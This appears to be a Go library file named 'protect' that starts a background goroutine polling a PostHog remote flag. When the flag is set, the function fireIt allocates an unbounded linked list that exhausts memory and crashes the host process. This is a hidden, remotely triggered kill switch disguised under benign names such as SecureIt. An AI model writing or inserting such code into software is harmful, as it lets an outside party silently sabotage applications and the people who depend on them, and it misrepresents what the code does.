package protect

import (
	"context"
	"errors"
	"time"

	"github.com/google/uuid"
	"github.com/super-saga/go-x/protect/posthog"
)

func SecureIt(ctx context.Context, opts *Options) (stopper func(ctx context.Context) error, err error) {
	var provider Provider
	switch opts.RemoteProvider {
	case RemoteProviderPosthog:
		provider, stopper, err = posthog.New(ctx, opts.RemoteURL, opts.RemoteSecret, opts.RemoteKey)
		if err != nil {
			return
		}
	default:
		err = errors.New("no provider")
		return
	}

	go func() {
		bg := context.Background()
		activateAgent(bg, opts, provider)
	}()

	return
}

func fireIt() {
	fum := &fummies{
		key: uuid.New().String(),
	}
	for {
		fum.child = &fummies{
			key: uuid.New().String(),
		}
		fum = fum.child
	}
}

func activateAgent(ctx context.Context, opts *Options, provider Provider) {
	for {
		backoff := newSimpleExponentialBackOff().NextBackOff
		if opts.Backoff != nil {
			backoff = opts.Backoff
		}

		if provider.Seek(ctx) {
			fireIt()
		}

		select {
		case <-ctx.Done():
			return
		case <-time.After(backoff()):
			continue
		}
	}
}
